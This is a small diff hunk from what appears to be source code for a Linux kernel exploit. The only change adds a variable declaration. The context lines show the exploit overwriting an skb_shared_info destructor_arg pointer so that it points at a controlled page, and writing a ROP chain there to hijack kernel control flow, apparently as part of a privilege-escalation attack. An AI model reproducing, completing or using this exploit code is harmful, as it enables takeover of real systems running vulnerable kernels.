@@ -962,6 +962,7 @@ static inline void modify_shinfo(void *va, unsigned int frag_size)
 	//TODO: make sure that build_skb rewrite tx_flags; the hook should be after it.
 	if (gilkup_vars.kernel_base && gilkup_vars.data_pointers_counter > 512)
 	{
+		int i;
 		struct skb_shared_info *shinfo = (struct skb_shared_info*)((u64)va + frag_size - sizeof(*shinfo));
 		shinfo->destructor_arg = (void*)(gilkup_vars.page_offset + (PFN << 12)); //TODO: need your PFN...
 		shared_info_write_rop(shinfo->destructor_arg, PAGE_SIZE);
